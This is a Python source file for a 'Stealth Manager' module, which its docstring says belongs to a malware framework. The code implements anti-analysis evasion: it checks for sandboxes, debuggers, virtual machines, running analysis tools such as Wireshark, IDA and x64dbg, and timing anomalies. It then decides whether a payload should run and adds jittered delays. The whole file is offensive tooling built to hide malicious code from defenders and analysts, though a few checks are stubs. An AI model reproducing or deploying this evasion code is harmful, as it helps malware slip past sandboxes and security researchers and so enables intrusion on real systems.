#!/usr/bin/env python3
"""
Stealth Manager for Malware Framework
Provides anti-detection and anti-analysis capabilities
"""

import os
import sys
import time
import platform
import subprocess
import psutil
import ctypes
from typing import Dict, Any, List, Optional
import logging

logger = logging.getLogger(__name__)

class StealthManager:
    """Manages stealth and anti-detection operations"""
    
    def __init__(self, config: Dict[str, Any]):
        """Initialize stealth manager"""
        self.config = config
        self.sandbox_detection = config.get('sandbox_detection', True)
        self.debugger_detection = config.get('debugger_detection', True)
        self.vm_detection = config.get('vm_detection', True)
        self.process_detection = config.get('process_detection', True)
        self.timing_detection = config.get('timing_detection', True)
        
        # Detection results cache
        self._detection_cache = {}
    
    def check_environment(self) -> bool:
        """Check if environment is safe to run"""
        try:
            # Run all detection checks
            checks = [
                self._check_sandbox(),
                self._check_debugger(),
                self._check_vm(),
                self._check_suspicious_processes(),
                self._check_timing()
            ]
            
            # Return True if all checks pass
            return all(checks)
        
        except Exception as e:
            logger.error(f"Environment check failed: {e}")
            return False
    
    def should_run(self) -> bool:
        """Check if payload should run based on stealth conditions"""
        try:
            # Check if any detection method found something suspicious
            if self._detection_cache.get('sandbox_detected', False):
                logger.warning("Sandbox environment detected")
                return False
            
            if self._detection_cache.get('debugger_detected', False):
                logger.warning("Debugger detected")
                return False
            
            if self._detection_cache.get('vm_detected', False):
                logger.warning("Virtual machine detected")
                return False
            
            if self._detection_cache.get('suspicious_processes', False):
                logger.warning("Suspicious processes detected")
                return False
            
            if self._detection_cache.get('timing_anomaly', False):
                logger.warning("Timing anomaly detected")
                return False
            
            return True
        
        except Exception as e:
            logger.error(f"Stealth check failed: {e}")
            return True  # Default to running if check fails
    
    def _check_sandbox(self) -> bool:
        """Check for sandbox environment"""
        if not self.sandbox_detection:
            return True
        
        try:
            # Check for common sandbox indicators
            sandbox_indicators = [
                # File system checks
                self._check_sandbox_files(),
                # Registry checks (Windows)
                self._check_sandbox_registry(),
                # Process checks
                self._check_sandbox_processes(),
                # Network checks
                self._check_sandbox_network(),
                # Hardware checks
                self._check_sandbox_hardware()
            ]
            
            # If any indicator is found, mark as detected
            if any(sandbox_indicators):
                self._detection_cache['sandbox_detected'] = True
                logger.warning("Sandbox environment detected")
                return False
            
            self._detection_cache['sandbox_detected'] = False
            return True
        
        except Exception as e:
            logger.error(f"Sandbox detection failed: {e}")
            return True
    
    def _check_sandbox_files(self) -> bool:
        """Check for sandbox-related files"""
        try:
            sandbox_files = [
                # Common sandbox file paths
                "C:\\sandbox",
                "C:\\analysis",
                "C:\\malware",
                "/tmp/sandbox",
                "/tmp/analysis",
                "/tmp/malware",
                # Analysis tool directories
                "C:\\Program Files\\Wireshark",
                "C:\\Program Files\\Process Monitor",
                "C:\\Program Files\\Process Explorer",
                "/usr/bin/wireshark",
                "/usr/bin/tcpdump"
            ]
            
            for file_path in sandbox_files:
                if os.path.exists(file_path):
                    logger.debug(f"Sandbox file found: {file_path}")
                    return True
            
            return False
        
        except Exception as e:
            logger.error(f"Sandbox file check failed: {e}")
            return False
    
    def _check_sandbox_registry(self) -> bool:
        """Check for sandbox-related registry entries (Windows)"""
        if platform.system() != "Windows":
            return False
        
        try:
            import winreg
            
            sandbox_keys = [
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Sandbox",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Analysis",
                r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Malware"
            ]
            
            for key_path in sandbox_keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    winreg.CloseKey(key)
                    logger.debug(f"Sandbox registry key found: {key_path}")
                    return True
                except WindowsError:
                    continue
            
            return False
        
        except Exception as e:
            logger.error(f"Sandbox registry check failed: {e}")
            return False
    
    def _check_sandbox_processes(self) -> bool:
        """Check for sandbox-related processes"""
        try:
            sandbox_processes = [
                # Analysis tools
                "wireshark.exe", "tcpdump", "procmon.exe", "procexp.exe",
                "processhacker.exe", "processmonitor.exe", "fiddler.exe",
                "burpsuite.exe", "charles.exe", "wireshark", "tcpdump",
                # Sandbox processes
                "sandbox.exe", "analysis.exe", "malware.exe", "detect.exe",
                "analyze.exe", "monitor.exe", "trace.exe", "debug.exe",
                # Virtualization tools
                "vboxservice.exe", "vboxtray.exe", "vmwaretray.exe",
                "vmwareuser.exe", "vmtoolsd.exe", "vboxservice", "vboxtray",
                "vmwaretray", "vmwareuser", "vmtoolsd"
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in [p.lower() for p in sandbox_processes]:
                        logger.debug(f"Sandbox process found: {proc.info['name']}")
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return False
        
        except Exception as e:
            logger.error(f"Sandbox process check failed: {e}")
            return False
    
    def _check_sandbox_network(self) -> bool:
        """Check for sandbox network indicators"""
        try:
            # Check for common sandbox network configurations
            # This is a basic check - more sophisticated checks could be added
            
            # Check if running in isolated network
            if self._is_isolated_network():
                logger.debug("Isolated network detected")
                return True
            
            return False
        
        except Exception as e:
            logger.error(f"Sandbox network check failed: {e}")
            return False
    
    def _is_isolated_network(self) -> bool:
        """Check if running in isolated network environment"""
        try:
            # Check for common sandbox IP ranges
            sandbox_ranges = [
                "192.168.1.0/24",  # Common sandbox range
                "10.0.0.0/8",      # Private network
                "172.16.0.0/12"    # Private network
            ]
            
            # This is a simplified check - in practice, you'd want more sophisticated network analysis
            return False
        
        except Exception as e:
            logger.error(f"Network isolation check failed: {e}")
            return False
    
    def _check_sandbox_hardware(self) -> bool:
        """Check for sandbox hardware indicators"""
        try:
            # Check for limited hardware resources (common in sandboxes)
            cpu_count = os.cpu_count()
            if cpu_count and cpu_count < 2:
                logger.debug(f"Limited CPU cores detected: {cpu_count}")
                return True
            
            # Check for limited memory
            memory = psutil.virtual_memory()
            if memory.total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
                logger.debug(f"Limited memory detected: {memory.total / (1024**3):.1f}GB")
                return True
            
            return False
        
        except Exception as e:
            logger.error(f"Sandbox hardware check failed: {e}")
            return False
    
    def _check_debugger(self) -> bool:
        """Check for debugger presence"""
        if not self.debugger_detection:
            return True
        
        try:
            # Check for debugger using various methods
            debugger_indicators = [
                self._check_debugger_api(),
                self._check_debugger_processes(),
                self._check_debugger_registry()
            ]
            
            if any(debugger_indicators):
                self._detection_cache['debugger_detected'] = True
                logger.warning("Debugger detected")
                return False
            
            self._detection_cache['debugger_detected'] = False
            return True
        
        except Exception as e:
            logger.error(f"Debugger detection failed: {e}")
            return True
    
    def _check_debugger_api(self) -> bool:
        """Check for debugger using API calls"""
        try:
            if platform.system() == "Windows":
                # Windows-specific debugger detection
                kernel32 = ctypes.windll.kernel32
                if kernel32.IsDebuggerPresent():
                    logger.debug("Debugger detected via IsDebuggerPresent")
                    return True
                
                # Check for debugger using PEB
                try:
                    import ctypes
                    from ctypes import wintypes
                    
                    kernel32 = ctypes.windll.kernel32
                    kernel32.GetCurrentProcess.restype = wintypes.HANDLE
                    
                    process = kernel32.GetCurrentProcess()
                    if kernel32.CheckRemoteDebuggerPresent(process, ctypes.byref(wintypes.BOOL())):
                        logger.debug("Remote debugger detected")
                        return True
                except:
                    pass
            
            return False
        
        except Exception as e:
            logger.error(f"Debugger API check failed: {e}")
            return False
    
    def _check_debugger_processes(self) -> bool:
        """Check for debugger processes"""
        try:
            debugger_processes = [
                # Windows debuggers
                "ollydbg.exe", "x64dbg.exe", "windbg.exe", "ida.exe", "ida64.exe",
                "radare2.exe", "ghidra.exe", "immunity.exe", "x32dbg.exe",
                # Linux debuggers
                "gdb", "lldb", "radare2", "ida", "ida64", "ghidra",
                # Analysis tools
                "processhacker.exe", "processmonitor.exe", "procexp.exe",
                "processhacker", "processmonitor", "procexp"
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in [p.lower() for p in debugger_processes]:
                        logger.debug(f"Debugger process found: {proc.info['name']}")
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return False
        
        except Exception as e:
            logger.error(f"Debugger process check failed: {e}")
            return False
    
    def _check_debugger_registry(self) -> bool:
        """Check for debugger registry entries (Windows)"""
        if platform.system() != "Windows":
            return False
        
        try:
            import winreg
            
            debugger_keys = [
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\AeDebug",
                r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
            ]
            
            for key_path in debugger_keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    winreg.CloseKey(key)
                    logger.debug(f"Debugger registry key found: {key_path}")
                    return True
                except WindowsError:
                    continue
            
            return False
        
        except Exception as e:
            logger.error(f"Debugger registry check failed: {e}")
            return False
    
    def _check_vm(self) -> bool:
        """Check for virtual machine environment"""
        if not self.vm_detection:
            return True
        
        try:
            vm_indicators = [
                self._check_vm_processes(),
                self._check_vm_files(),
                self._check_vm_registry(),
                self._check_vm_hardware()
            ]
            
            if any(vm_indicators):
                self._detection_cache['vm_detected'] = True
                logger.warning("Virtual machine detected")
                return False
            
            self._detection_cache['vm_detected'] = False
            return True
        
        except Exception as e:
            logger.error(f"VM detection failed: {e}")
            return True
    
    def _check_vm_processes(self) -> bool:
        """Check for VM-related processes"""
        try:
            vm_processes = [
                # VMware processes
                "vmwaretray.exe", "vmwareuser.exe", "vmtoolsd.exe",
                "vmwaretray", "vmwareuser", "vmtoolsd",
                # VirtualBox processes
                "vboxservice.exe", "vboxtray.exe", "vboxservice", "vboxtray",
                # Hyper-V processes
                "vmms.exe", "vmwp.exe", "vmms", "vmwp",
                # Other virtualization tools
                "qemu-ga.exe", "qemu-ga", "xenstore.exe", "xenstore"
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in [p.lower() for p in vm_processes]:
                        logger.debug(f"VM process found: {proc.info['name']}")
                        return True
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            return False
        
        except Exception as e:
            logger.error(f"VM process check failed: {e}")
            return False
    
    def _check_vm_files(self) -> bool:
        """Check for VM-related files"""
        try:
            vm_files = [
                # VMware files
                "C:\\Program Files\\VMware\\VMware Tools",
                "C:\\Program Files\\Common Files\\VMware",
                "/usr/bin/vmware-toolbox-cmd",
                "/usr/bin/vmware-user",
                # VirtualBox files
                "C:\\Program Files\\Oracle\\VirtualBox Guest Additions",
                "/usr/bin/VBoxService",
                "/usr/bin/VBoxClient",
                # Hyper-V files
                "C:\\Program Files\\Microsoft\\Hyper-V",
                # Other VM files
                "/usr/bin/qemu-ga",
                "/usr/bin/xenstore"
            ]
            
            for file_path in vm_files:
                if os.path.exists(file_path):
                    logger.debug(f"VM file found: {file_path}")
                    return True
            
            return False
        
        except Exception as e:
            logger.error(f"VM file check failed: {e}")
            return False
    
    def _check_vm_registry(self) -> bool:
        """Check for VM registry entries (Windows)"""
        if platform.system() != "Windows":
            return False
        
        try:
            import winreg
            
            vm_keys = [
                r"SYSTEM\CurrentControlSet\Services\Disk\Enum\0",
                r"SYSTEM\CurrentControlSet\Services\Disk\Enum\1",
                r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0"
            ]
            
            vm_strings = [
                "VMware", "VBox", "Virtual", "QEMU", "Xen"
            ]
            
            for key_path in vm_keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    try:
                        value, _ = winreg.QueryValueEx(key, "Identifier")
                        for vm_string in vm_strings:
                            if vm_string.lower() in value.lower():
                                logger.debug(f"VM registry value found: {value}")
                                return True
                    except WindowsError:
                        pass
                    finally:
                        winreg.CloseKey(key)
                except WindowsError:
                    continue
            
            return False
        
        except Exception as e:
            logger.error(f"VM registry check failed: {e}")
            return False
    
    def _check_vm_hardware(self) -> bool:
        """Check for VM hardware indicators"""
        try:
            # Check for common VM hardware characteristics
            # This is a basic check - more sophisticated checks could be added
            
            # Check for limited hardware resources
            cpu_count = os.cpu_count()
            if cpu_count and cpu_count < 2:
                logger.debug(f"Limited CPU cores: {cpu_count}")
                return True
            
            # Check for limited memory
            memory = psutil.virtual_memory()
            if memory.total < 4 * 1024 * 1024 * 1024:  # Less than 4GB
                logger.debug(f"Limited memory: {memory.total / (1024**3):.1f}GB")
                return True
            
            return False
        
        except Exception as e:
            logger.error(f"VM hardware check failed: {e}")
            return False
    
    def _check_suspicious_processes(self) -> bool:
        """Check for suspicious analysis processes"""
        if not self.process_detection:
            return True
        
        try:
            suspicious_processes = [
                # Analysis tools
                "wireshark.exe", "tcpdump", "procmon.exe", "procexp.exe",
                "processhacker.exe", "processmonitor.exe", "fiddler.exe",
                "burpsuite.exe", "charles.exe", "wireshark", "tcpdump",
                # Debuggers
                "ollydbg.exe", "x64dbg.exe", "windbg.exe", "ida.exe",
                "radare2.exe", "ghidra.exe", "gdb", "lldb",
                # Monitoring tools
                "processhacker.exe", "processmonitor.exe", "procexp.exe",
                "processhacker", "processmonitor", "procexp"
            ]
            
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() in [p.lower() for p in suspicious_processes]:
                        logger.debug(f"Suspicious process found: {proc.info['name']}")
                        self._detection_cache['suspicious_processes'] = True
                        return False
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
            
            self._detection_cache['suspicious_processes'] = False
            return True
        
        except Exception as e:
            logger.error(f"Suspicious process check failed: {e}")
            return True
    
    def _check_timing(self) -> bool:
        """Check for timing anomalies (anti-debugging)"""
        if not self.timing_detection:
            return True
        
        try:
            # Measure time for a simple operation
            start_time = time.time()
            time.sleep(0.1)  # Sleep for 100ms
            end_time = time.time()
            
            actual_time = end_time - start_time
            expected_time = 0.1
            
            # Check if timing is significantly off (indicating debugger)
            if abs(actual_time - expected_time) > 0.05:  # 50ms tolerance
                logger.debug(f"Timing anomaly detected: {actual_time:.3f}s vs {expected_time:.3f}s")
                self._detection_cache['timing_anomaly'] = True
                return False
            
            self._detection_cache['timing_anomaly'] = False
            return True
        
        except Exception as e:
            logger.error(f"Timing check failed: {e}")
            return True
    
    def is_debug_mode(self) -> bool:
        """Check if running in debug mode"""
        try:
            # Check for debug environment variables
            debug_vars = ['DEBUG', 'PYTHONDEBUG', 'PYTHONVERBOSE']
            for var in debug_vars:
                if os.environ.get(var):
                    return True
            
            # Check for debug command line arguments
            if '--debug' in sys.argv or '-d' in sys.argv:
                return True
            
            return False
        
        except Exception as e:
            logger.error(f"Debug mode check failed: {e}")
            return False
    
    def get_detection_results(self) -> Dict[str, Any]:
        """Get all detection results"""
        return self._detection_cache.copy()
    
    def add_delay(self, base_delay: float = 1.0, jitter: float = 0.3) -> None:
        """Add random delay with jitter"""
        try:
            import random
            actual_delay = base_delay + random.uniform(-jitter, jitter)
            actual_delay = max(0, actual_delay)  # Ensure non-negative
            time.sleep(actual_delay)
        except Exception as e:
            logger.error(f"Delay failed: {e}")
            time.sleep(base_delay)  # Fallback to base delay 